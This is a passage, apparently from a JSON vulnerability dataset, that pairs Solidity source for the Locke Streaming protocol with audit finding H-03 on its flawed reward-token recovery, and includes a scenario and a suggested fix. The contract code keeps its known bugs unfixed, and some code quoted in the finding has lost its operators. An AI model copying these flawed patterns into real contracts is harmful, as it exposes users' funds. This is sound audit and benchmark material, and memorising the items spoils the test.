}\n    function assertGeDecimal(uint a, uint b, uint decimals) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGeDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGeDecimal(a, b, decimals);\n        }\n    }\n\n    function assertLt(uint a, uint b) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLt(uint a, uint b, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLt(a, b);\n        }\n    }\n    function assertLt(int a, int b) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLt(int a, int b, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLt(a, b);\n        }\n    }\n    function assertLtDecimal(int a, int b, uint decimals) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLtDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLtDecimal(a, b, decimals);\n        }\n    }\n    function assertLtDecimal(uint a, uint b, uint decimals) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLtDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLtDecimal(a, b, decimals);\n        }\n    }\n\n    function assertLe(uint a, uint b) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLe(uint a, uint b, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertLe(a, b);\n        }\n    }\n    function assertLe(int a, int b) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLe(int a, int b, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertLe(a, b);\n        }\n    }\n    function assertLeDecimal(int a, int b, uint decimals) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLeDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertLeDecimal(a, b, decimals);\n        }\n    }\n    function assertLeDecimal(uint a, uint b, uint decimals) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLeDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertGeDecimal(a, b, decimals);\n        }\n    }\n\n    function assertEq(string memory a, string memory b) internal {\n        if (keccak256(abi.encodePacked(a)) != keccak256(abi.encodePacked(b))) {\n            emit log(\"Error: a == b not satisfied [string]\");\n            emit log_named_string(\"  Value a\", a);\n            emit log_named_string(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertEq(string memory a, string memory b, string memory err) internal {\n        if (keccak256(abi.encodePacked(a)) != keccak256(abi.encodePacked(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function checkEq0(bytes memory a, bytes memory b) internal pure returns (bool ok) {\n        ok = true;\n        if (a.length == b.length) {\n            for (uint i = 0; i < a.length; i++) {\n                if (a[i] != b[i]) {\n                    ok = false;\n                }\n            }\n        } else {\n            ok = false;\n        }\n    }\n    function assertEq0(bytes memory a, bytes memory b) internal {\n        if (!checkEq0(a, b)) {\n            emit log(\"Error: a == b not satisfied [bytes]\");\n            emit log_named_bytes(\"  Expected\", a);\n            emit log_named_bytes(\"    Actual\", b);\n            fail();\n        }\n    }\n    function assertEq0(bytes memory a, bytes memory b, string memory err) internal {\n        if (!checkEq0(a, b)) {\n            emit log_named_string(\"Error\", err);\n            assertEq0(a, b);\n        }\n    }\n}\n\n\n",
        "CodeNames": [
            "Locke.sol",
            "test.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-03",
                "Location": [
                    "//solidity\nfunction recoverTokens(address token, address recipient) public lock {\n    if (token == rewardToken) {\n        require(block.timestamp  endRewardLock, \"time\");\n\n        // check what isnt claimable by depositors and governance\n        // @audit-issue rewardTokenAmount increased on fundStream, but never decreased! this excess underflows\n        uint256 excess = ERC20(token).balanceOf(address(this)) (rewardTokenAmount + rewardTokenFeeAmount);\n        ERC20(token).safeTransfer(recipient, excess);\n\n        emit RecoveredTokens(token, recipient, excess);\n        return;\n    }\n    // ...\n"
                ],
                "Type": " Reward token not correctly recovered",
                "Description": "\nThe Streaming contract allows recovering the reward token by calling recoverTokens(rewardToken, recipient).\n\nHowever, the excess amount is computed incorrectly as ERC20(token).balanceOf(address(this)) (rewardTokenAmount + rewardTokenFeeAmount):\n\nsolidity\nfunction recoverTokens(address token, address recipient) public lock {\n    if (token == rewardToken) {\n        require(block.timestamp  endRewardLock, \"time\");\n\n        // check what isnt claimable by depositors and governance\n        // @audit-issue rewardTokenAmount increased on fundStream, but never decreased! this excess underflows\n        uint256 excess = ERC20(token).balanceOf(address(this)) (rewardTokenAmount + rewardTokenFeeAmount);\n        ERC20(token).safeTransfer(recipient, excess);\n\n        emit RecoveredTokens(token, recipient, excess);\n        return;\n    }\n    // ...\n\n\nNote that rewardTokenAmount only ever *increases* (when calling fundStream) but it never decreases when claiming the rewards through claimReward.\nHowever, claimReward transfers out the reward token.\n\nTherefore, the rewardTokenAmount never tracks the contract's reward balance and the excess cannot be computed that way.\n\n\nAssume no reward fees for simplicity and only a single user staking.\n\n*   Someone funds 1000 reward tokens through fundStream(1000). Then rewardTokenAmount = 1000\n*   The stream and reward lock period is over, i.e. block.timestamp  endRewardLock\n*   The user claims their full reward and receives 1000 reward tokens by calling claimReward(). The reward contract balance is now 0 but rewardTokenAmount = 1000\n*   Some fool sends 1000 reward tokens to the contract by accident. These cannot be recovered as the excess = balance rewardTokenAmount = 0\n\n\nReward token recovery does not work.\n\n",
                "Repair": "\nThe claimed rewards need to be tracked as well, just like the claimed deposits are tracked.\nI think you can even decrease rewardTokenAmount in claimReward because at this point rewardTokenAmount is not used to update the cumulativeRewardPerToken anymore.\n\nbrockelmore (Streaming Protocol) confirmed(https://github.com/code-423n4/2021-11-streaming-findings/issues/214#issuecomment-989285321)\n\n\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.0;\n\nimport \"./LockeERC20.sol\";\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"solmate/tokens/ERC20.sol\";\n\n// ====== Governance =====\ncontract Governed {\n    address public gov;\n    address private pendingGov;\n    address public emergency_gov;\n\n    event NewGov(address indexed oldGov, address indexed newGov);\n    event NewPendingGov(address indexed oldPendingGov, address indexed newPendingGov);\n\n    constructor(address _governor, address _emergency_governor) public {\n        gov = _governor;\n        emergency_gov = _emergency_governor;\n    }\n\n    function governorship() public view returns (address, address, address) {\n        return (gov, emergency_gov, pendingGov);\n    }\n\n    /// Update pending governor\n    function setPendingGov(address newPendingGov) governed public {\n        address old = pendingGov;\n        pendingGov = newPendingGov;\n        emit NewPendingGov(old, newPendingGov);\n    }\n\n    /// Accepts governorship\n    function acceptGov() public {\n        require(pendingGov == msg.sender, \"!pending\");\n        address old = gov;\n        gov = pendingGov;\n        emit NewGov(old, pendingGov);\n    }\n\n    function setEmergencyGov(address who) public governed {\n        emergency_gov = who;\n    } \n\n    /// Remove governor\n    function __abdicate() governed public {\n        address old = gov;\n        gov = address(0);\n        emit NewGov(old, address(0));\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier governed {\n        require(msg.sender == gov, \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier emergency_governed {\n        require(msg.sender == gov || msg.sender == emergency_gov, \"!egov\");\n        _;\n    }\n}\n\ninterface IGoverned {\n    function gov() external view returns (address);\n    function emergency_gov() external view returns (address);\n}\n\nabstract contract ExternallyGoverned {\n    IGoverned public gov;\n\n    constructor(address governor) {\n        gov = IGoverned(governor);\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier externallyGoverned {\n        require(msg.sender == gov.gov(), \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier externallyEmergencyGoverned {\n        require(msg.sender == gov.gov() || msg.sender == gov.emergency_gov(), \"!e_gov\");\n        _;\n    }\n}\n\ninterface LockeCallee {\n    function lockeCall(address initiator, address token, uint256 amount, bytes calldata data) external;\n}\n\n// ====== Stream =====\ncontract Stream is LockeERC20, ExternallyGoverned {\n    using SafeTransferLib for ERC20;    \n    // ======= Structs ========\n    struct TokenStream {\n        uint256 lastCumulativeRewardPerToken;\n        uint256 virtualBalance;\n        uint112 rewards;\n        uint112 tokens;\n        uint32 lastUpdate;\n        bool merkleAccess;\n    }\n\n    // ======= Storage ========\n    // ==== Immutables =====\n    // stream start time\n    uint32 private immutable startTime;\n    // length of stream\n    uint32 private immutable streamDuration;\n    // length of time depositTokens are locked after stream ends\n    uint32 private immutable depositLockDuration;\n    // length of time rewardTokens are locked after stream ends\n    uint32 private immutable rewardLockDuration;\n\n    // end of stream\n    uint32 private immutable endStream;\n    // end of deposit lock\n    uint32 private immutable endDepositLock;\n    // end of reward lock\n    uint32 private immutable endRewardLock;\n\n    // Token given to depositer\n    address public immutable rewardToken;\n    // Token deposited\n    address public immutable depositToken;\n\n    // This stream's id\n    uint64 public immutable streamId;\n\n    // fee percent on reward tokens\n    uint16 private immutable feePercent;\n    // are fees enabled\n    bool private immutable feeEnabled;\n\n    // deposits are basically a *sale* to the stream creator if true\n    bool public immutable isSale;\n\n    // stream creator\n    address public immutable streamCreator;\n\n    uint112 private immutable depositDecimalsOne;\n    // ============\n\n    //  == sloc a ==\n    // internal reward token amount to be given to depositors\n    uint112 private rewardTokenAmount;\n    // internal deposit token amount locked/to be sold to stream creator\n    uint112 private depositTokenAmount;\n    // ============\n\n    // == slot b ==\n    uint112 private rewardTokenFeeAmount;\n    uint112 private depositTokenFlashloanFeeAmount;\n    uint8 private unlocked = 1;\n    bool private claimedDepositTokens;\n    // ============\n\n    // == slot c ==\n    uint256 private cumulativeRewardPerToken;\n    // ============\n\n    // == slot d ==\n    uint256 private totalVirtualBalance;\n    // ============\n\n    // == slot e ==\n    uint112 public unstreamed;\n    uint112 private redeemedDepositTokens;\n    uint32 private lastUpdate;\n    // ============\n\n    // mapping of address to number of tokens not yet streamed over\n    mapping (address => TokenStream) public tokensNotYetStreamed;\n\n    // external incentives to stream creator\n    mapping (address => uint112) public incentives;\n\n    // ======= Events ========\n    event StreamFunded(uint256 amount);\n    event Staked(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n    event StreamIncentivized(address indexed token, uint256 amount);\n    event StreamIncentiveClaimed(address indexed token, uint256 amount);\n    event SoldTokensClaimed(address indexed who, uint256 amount);\n    event DepositTokensReclaimed(address indexed who, uint256 amount);\n    event FeesClaimed(address indexed token, address indexed who, uint256 amount);\n    event RecoveredTokens(address indexed token, address indexed recipient, uint256 amount);\n    event RewardsClaimed(address indexed who, uint256 amount);\n    event Flashloaned(address indexed token, address indexed who, uint256 amount, uint256 fee);\n\n    // ======= Modifiers ========\n    modifier updateStream(address who) {\n        // save bytecode space by making it a jump instead of inlining at cost of gas\n        updateStreamInternal(who);\n        _;\n    }\n\n    function updateStreamInternal(address who) internal {\n        require(block.timestamp < endStream , \"!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        if (block.timestamp >= startTime) {\n            // set lastUpdates if need be\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = uint32(block.timestamp);\n            }\n\n            // accumulate reward per token info\n            cumulativeRewardPerToken = rewardPerToken();\n\n            // update user rewards\n            ts.rewards = earned(ts, cumulativeRewardPerToken);\n            // update users last cumulative reward per token\n            ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n            // update users unstreamed balance\n            uint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;\n            if (acctTimeDelta > 0 && ts.tokens > 0) {\n                // some time has passed since this user last interacted\n                // update ts not yet streamed\n                ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n\n            // handle global unstreamed\n            uint32 tdelta = uint32(block.timestamp - lastUpdate);\n            // stream tokens over\n            if (tdelta > 0 && unstreamed > 0) {\n                uint256 globalStreamingSpeedPerSecond = (uint256(unstreamed) * 10**6)/ (endStream - lastUpdate);\n                unstreamed -= uint112((uint256(tdelta) * globalStreamingSpeedPerSecond) / 10**6);\n            }\n            // already ensure that blocktimestamp is less than endStream so guaranteed ok here\n            lastUpdate = uint32(block.timestamp);\n        } else {\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = startTime;\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = startTime;\n            }\n        }\n    }\n\n\n    function lockInternal() internal {\n        require(unlocked == 1, \"re\");\n        unlocked = 2;\n    }\n    modifier lock {\n        lockInternal();\n        _;\n        unlocked = 1;\n    }\n\n    constructor(\n        uint64 _streamId,\n        address creator,\n        bool _isSale,\n        address _rewardToken,\n        address _depositToken,\n        uint32 _startTime,\n        uint32 _streamDuration,\n        uint32 _depositLockDuration,\n        uint32 _rewardLockDuration,\n        uint16 _feePercent,\n        bool _feeEnabled\n\n    )\n        LockeERC20(_depositToken, _streamId, _startTime + _streamDuration)\n        ExternallyGoverned(msg.sender) // inherit factory governance\n        public \n    {\n        // set fee info\n        feePercent = _feePercent;\n        feeEnabled = _feeEnabled;\n\n        // limit feePercent\n        require(feePercent < 10000, \"fee\");\n    \n        // store streamParams\n        startTime = _startTime;\n        streamDuration = _streamDuration;\n        depositLockDuration = _depositLockDuration;\n        rewardLockDuration = _rewardLockDuration;\n\n        endStream = startTime + streamDuration;\n        endDepositLock = endStream + depositLockDuration;\n        endRewardLock = endStream + rewardLockDuration;\n    \n        // set tokens\n        depositToken = _depositToken;\n        rewardToken = _rewardToken;\n\n        // set streamId\n        streamId = _streamId;\n\n        // set sale info\n        isSale = _isSale;\n    \n        streamCreator = creator;\n\n        depositDecimalsOne = uint112(10**ERC20(depositToken).decimals());\n    }\n\n    /**\n     * @dev Returns relevant internal token amounts\n    **/\n    function tokenAmounts() public view returns (uint112, uint112, uint112, uint112) {\n        return (rewardTokenAmount, depositTokenAmount, rewardTokenFeeAmount, depositTokenFlashloanFeeAmount);\n    }\n\n    /**\n     * @dev Returns fee parameters\n    **/\n    function feeParams() public view returns (uint16, bool) {\n        return (feePercent, feeEnabled);\n    }\n\n    /**\n     * @dev Returns stream parameters\n    **/\n    function streamParams() public view returns (uint32,uint32,uint32,uint32) {\n        return (\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration\n        );\n    }\n\n    function lastApplicableTime() internal view returns (uint32) {\n        return block.timestamp <= endStream ? uint32(block.timestamp) : endStream;\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalVirtualBalance == 0) {\n            return cumulativeRewardPerToken;\n        } else {\n            // \u2206time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance\n            return cumulativeRewardPerToken + (\n                ((uint256(lastApplicableTime()) - lastUpdate) * rewardTokenAmount * depositDecimalsOne/streamDuration) \n                / totalVirtualBalance\n            );\n        }\n    }\n\n    function dilutedBalance(uint112 amount) internal view returns (uint256) {\n        // duration / timeRemaining * amount\n        if (block.timestamp < startTime) {\n            return amount;\n        } else {\n            uint32 timeRemaining = endStream - uint32(block.timestamp);\n            return ((uint256(streamDuration) * amount * 10**6) / timeRemaining) / 10**6;\n        }\n    }\n\n    function getEarned(address who) public view returns (uint256) {\n        TokenStream storage ts = tokensNotYetStreamed[who];\n        return earned(ts, rewardPerToken());\n    }\n\n    function earned(TokenStream storage ts, uint256 currCumRewardPerToken) internal view returns (uint112) {\n        return uint112(ts.virtualBalance * (currCumRewardPerToken - ts.lastCumulativeRewardPerToken) / depositDecimalsOne) + ts.rewards;\n    }\n\n    /**\n     * @dev Allows _anyone_ to fund this stream, if its before the stream start time\n    **/\n    function fundStream(uint112 amount) public lock {\n        require(amount > 0, \"amt\");\n        require(block.timestamp < startTime, \"time\");\n        uint112 amt;\n\n        // transfer from sender\n        uint256 prevBal = ERC20(rewardToken).balanceOf(address(this));\n        ERC20(rewardToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(rewardToken).balanceOf(address(this));\n        require(newBal < type(uint112).max && newBal > prevBal, \"erc\");\n\n        amount = uint112(newBal - prevBal);\n        // if fee is enabled, take a fee\n        if (feeEnabled) {\n            // Safety:\n            //  1. feePercent & y are casted up to u256, so cannot overflow when multiplying\n            //  2. downcast is safe because (x*y)/MAX_X is guaranteed to be smaller than y which is uint112\n            //  3. amount is guaranteed to be greater than feeAmt\n            uint112 feeAmt;\n            unchecked {\n                feeAmt = uint112(uint256(feePercent) * uint256(amount) / 10000); \n                amt = amount - feeAmt;\n            }\n\n            // since this operation can be repeated, we cannot assume no overflow so use checked math\n            rewardTokenFeeAmount += feeAmt;\n            rewardTokenAmount += amt;\n        } else {\n            amt = amount;\n            rewardTokenAmount += amt;\n        }\n        \n        emit StreamFunded(amt);\n    }\n\n    /**\n     *  @dev Deposits depositTokens into this stream\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function stake(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // require(block.timestamp < endStream, \"stake:!stream\");\n\n        // transfer tokens over\n        uint256 prevBal = ERC20(depositToken).balanceOf(address(this));\n        ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(depositToken).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n        \n        uint112 trueDepositAmt = uint112(newBal - prevBal);\n\n        depositTokenAmount += trueDepositAmt;\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        ts.tokens += trueDepositAmt;\n\n        uint256 virtualBal = dilutedBalance(trueDepositAmt);\n        ts.virtualBalance += virtualBal;\n        totalVirtualBalance += virtualBal;\n        unstreamed += trueDepositAmt;\n\n        if (!isSale) {\n            // not a straight sale, so give the user some receipt tokens\n            _mint(msg.sender, trueDepositAmt);\n        } else {\n        }\n\n        emit Staked(msg.sender, trueDepositAmt);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to withdraw a specific amount of depositTokens during a stream,\n     *  up to their tokensNotYetStreamed amount\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function withdraw(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        require(ts.tokens >= amount, \"amt\");\n        ts.tokens -= amount;\n\n        uint256 virtualBal = dilutedBalance(amount);\n        ts.virtualBalance -= virtualBal;\n        totalVirtualBalance -= virtualBal;\n        depositTokenAmount -= amount;\n        if (!isSale) {\n            _burn(msg.sender, amount);\n        } else {\n        }\n\n        // do the transfer\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit Withdrawn(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to exit their entire remaining tokens that haven't streamed\n     *  and burns receiptTokens if its not a sale.\n     * \n     *  additionally, updates tokensNotYetStreamed. Lock is done in withdraw\n    */ \n    function exit() public updateStream(msg.sender) {\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        uint112 amount = ts.tokens;\n        withdraw(amount);\n    }\n\n    /**\n     *  @dev Allows anyone to incentivize this stream with extra tokens\n     *  and requires the incentive to not be the reward or deposit token\n    */ \n    function createIncentive(address token, uint112 amount) public lock {\n        require(token != rewardToken && token != depositToken, \"inc\");\n        \n        uint256 prevBal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(token).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n\n        uint112 amt = uint112(newBal - prevBal);\n        incentives[token] += amt;\n        emit StreamIncentivized(token, amt);\n    }\n\n    /**\n     *  @dev Allows the stream creator to claim an incentive once the stream is done\n    */ \n    function claimIncentive(address token) public lock {\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        uint112 amount = incentives[token];\n        require(amount > 0, \"amt\");\n        incentives[token] = 0;\n        ERC20(token).safeTransfer(msg.sender, amount);\n        emit StreamIncentiveClaimed(token, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder to reclaim deposit tokens if the deposit lock is done & their receiptToken amount\n     *  is greater than the requested amount\n    */ \n    function claimDepositTokens(uint112 amount) public lock {\n        require(!isSale, \"sale\");\n        // NOTE: given that endDepositLock is strictly *after* the last time withdraw or exit is callable\n        // we dont need to updateStream(msg.sender)\n        require(amount > 0, \"amt\");\n\n        // is the stream over + the deposit lock period over? thats the only time receiptTokens can be burned for depositTokens after stream is over\n        require(block.timestamp > endDepositLock, \"lock\");\n\n        // burn the receiptTokens\n        _burn(msg.sender, amount);\n\n        redeemedDepositTokens += amount;\n\n        // send the receipt token holder back the funds\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit DepositTokensReclaimed(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder (or original depositor in case of a sale) to claim their rewardTokens\n    */ \n    function claimReward() public lock {\n        require(block.timestamp > endRewardLock, \"lock\");\n\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        // accumulate reward per token info\n        cumulativeRewardPerToken = rewardPerToken();\n\n        // update user rewards\n        ts.rewards = earned(ts, cumulativeRewardPerToken);\n        // update users last cumulative reward per token\n        ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n        lastUpdate = lastApplicableTime();\n\n        uint256 rewardAmt = ts.rewards;\n        ts.rewards = 0;\n\n        require(rewardAmt > 0, \"amt\");\n\n        // transfer the tokens\n        ERC20(rewardToken).safeTransfer(msg.sender, rewardAmt);\n\n        emit RewardsClaimed(msg.sender, rewardAmt);\n    }\n\n    /**\n     *  @dev Allows a creator to claim sold tokens if the stream has ended & this contract is a sale\n    */ \n    function creatorClaimSoldTokens(address destination) public lock {\n        // can only claim when its a sale\n        require(isSale, \"!sale\");\n\n        // only can claim once\n        require(!claimedDepositTokens, \"claimed\");\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        \n        uint112 amount = depositTokenAmount;\n        claimedDepositTokens = true;\n\n        ERC20(depositToken).safeTransfer(destination, amount);\n\n        emit SoldTokensClaimed(destination, amount);\n    }\n\n    /**\n     *  @dev Allows the governance contract of the factory to select a destination\n     *  and transfer fees (in rewardTokens) to that address totaling the total fee amount\n    */ \n    function claimFees(address destination) public lock externallyGoverned {\n        // Stream is done\n        require(block.timestamp >= endStream, \"stream\");\n\n        // reset fee amount\n        uint112 fees = rewardTokenFeeAmount;\n        if (fees > 0) {\n            rewardTokenFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(rewardToken).safeTransfer(destination, fees);\n            emit FeesClaimed(rewardToken, destination, fees);\n        }\n\n        fees = depositTokenFlashloanFeeAmount;\n        if (fees > 0) {\n            depositTokenFlashloanFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(depositToken).safeTransfer(destination, fees);\n\n            emit FeesClaimed(depositToken, destination, fees);\n        }\n        \n    }\n\n    // ======== Non-protocol functions ========\n\n    /**\n     *  @dev Allows the stream creator to save tokens\n     *  There are some limitations to this:\n     *      1. if its deposit token:\n     *          - DepositLock is fully done\n     *          - There are excess deposit tokens (balance - depositTokenAmount)\n     *      2. if its the reward token:\n     *          - RewardLock is fully done\n     *          - Excess defined as balance - (rewardTokenAmount + rewardTokenFeeAmount)\n     *      3. if incentivized:\n     *          - excesss defined as bal - incentives[token]\n    */ \n    function recoverTokens(address token, address recipient) public lock {\n        // NOTE: it is the stream creators responsibility to save\n        // tokens on behalf of their users.\n        require(msg.sender == streamCreator, \"!creator\");\n        if (token == depositToken) {\n            require(block.timestamp > endDepositLock, \"time\");\n            // get the balance of this contract\n            // check what isnt claimable by either party\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n            // allow saving of the token\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n        \n        if (token == rewardToken) {\n            require(block.timestamp > endRewardLock, \"time\");\n            // check current balance vs internal balance\n            //\n            // NOTE: if a token rebases, i.e. changes balance out from under us,\n            // most of this contract breaks and rugs depositors. this isn't exclusive\n            // to this function but this function would in theory allow someone to rug\n            // and recover the excess (if it is worth anything)\n\n            // check what isnt claimable by depositors and governance\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        if (incentives[token] > 0) {\n            require(block.timestamp >= endStream, \"stream\");\n            uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];\n            ERC20(token).safeTransfer(recipient, excess);\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        // not reward token nor deposit nor incentivized token, free to transfer\n        uint256 bal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransfer(recipient, bal);\n        emit RecoveredTokens(token, recipient, bal);\n    }\n\n    /**\n     *  @dev Allows anyone to flashloan reward or deposit token for a 10bps fee\n    */\n    function flashloan(address token, address to, uint112 amount, bytes memory data) public lock {\n        require(token == depositToken || token == rewardToken, \"erc\");\n\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        ERC20(token).safeTransfer(to, amount);\n\n        // the `to` contract should have a public function with the signature:\n        // function lockeCall(address initiator, address token, uint256 amount, bytes memory data);\n        LockeCallee(to).lockeCall(msg.sender, token, amount, data);\n\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        uint112 feeAmt = amount * 10 / 10000; // 10bps fee\n\n        if (token == depositToken) {\n            depositTokenFlashloanFeeAmount += feeAmt;\n            require(preDepositTokenBalance + feeAmt <= postDepositTokenBalance, \"f1\");\n            require(preRewardTokenBalance <= postRewardTokenBalance, \"f2\");\n        } else {\n            rewardTokenFeeAmount += feeAmt;\n            require(preDepositTokenBalance <= postDepositTokenBalance, \"f3\");\n            require(preRewardTokenBalance + feeAmt <= postRewardTokenBalance, \"f4\");\n        }\n\n        emit Flashloaned(token, msg.sender, amount, feeAmt);\n    }\n\n    /**\n     *  @dev Allows inherited governance contract to call functions on behalf of this contract\n     *  This is a potentially dangerous function so to ensure trustlessness, *all* balances\n     *  that may matter are guaranteed to not change.\n     * \n     *  The primary usecase is for claiming potentially airdrops that may have accrued on behalf of this contract\n    */\n    function arbitraryCall(address who, bytes memory data) public lock externallyGoverned {\n        // cannot have an active incentive for the callee\n        require(incentives[who] == 0, \"inc\");\n        // cannot be to deposit token nor reward token\n        require(who != depositToken && who != rewardToken, \"erc\");\n\n        // get token balances\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        (bool success, bytes memory _ret) = who.call(data);\n        require(success);\n\n        // require no change in balances\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n        require(preDepositTokenBalance == postDepositTokenBalance && preRewardTokenBalance == postRewardTokenBalance, \"erc\");\n    }\n}\n\ncontract StreamFactory is Governed {\n\n    // ======= Structs ========\n    struct GovernableStreamParams {\n        uint32 maxDepositLockDuration;\n        uint32 maxRewardLockDuration;\n        uint32 maxStreamDuration;\n        uint32 minStreamDuration;\n    }\n\n    struct GovernableFeeParams {\n        uint16 feePercent;\n        bool 